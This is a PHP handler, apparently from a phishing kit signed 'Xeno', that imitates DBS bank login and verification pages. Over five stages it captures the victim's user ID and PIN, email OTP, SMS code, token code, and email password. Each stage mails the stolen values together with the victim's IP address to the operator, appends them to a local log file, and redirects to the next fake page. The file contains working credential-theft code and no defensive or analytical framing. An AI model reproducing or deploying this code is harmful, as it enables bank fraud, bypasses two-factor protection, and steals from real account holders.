<?php
session_start();
include_once 'mail.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$praga=rand();
$praga=md5($praga);
$page= $_POST['page'];
$rad= $_POST['rad'];
$rad2= $_POST['rad2'];







if ($page == '1') 
{ 

$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  DBS Log   | -----------\n";
$message .= "User  :  ".$_POST['ramid']." \n";
$message .= "Pin   :  ".$_POST['ramida']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$subject = "| DBS Log By Xeno | $ip |";
mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);


header("Location:./otp-mail.php?otp_id=$praga-session_id=$praga$praga&rad=$rad");
}



elseif ($page == '2') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |   EMAIL OTP DBS   | -----------\n";
$message .= "EMAIL OTP     :  ".$_POST['otp']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$subject = "| EMAIL OTP DBS By Xeno | $ip |";
mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);


	header("Location:./otp.php?otp_id=$praga-session_id=$praga$praga&rad2=$rad2");
}



elseif ($page == '3') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |   SMS DBS   | -----------\n";
$message .= "SMS     :  ".$_POST['otp']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$subject = "| SMS DBS By Xeno | $ip |";
mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);


	header("Location:./token.php?otp_id=$praga-session_id=$praga$praga&rad2=$rad2");
}




elseif ($page == '4') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |   Token DBS   | -----------\n";
$message .= "Token     :  ".$_POST['otp']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$subject = "| Token DBS By Xeno | $ip |";
mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);


	header("Location:./auth.php?otp_id=$praga-session_id=$praga$praga&rad2=$rad2");
}








elseif ($page == '5') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |    DBS Email  | -----------\n";
$message .= "Email      :  ".$_POST['email']." \n";
$message .= "Password   :  ".$_POST['password']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$subject = "| DBS Email By Xeno | $ip |";
mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);

	header("Location:./done.php?otp_id=$praga-session_id=$praga$praga&rad2=$rad2");
}







?>


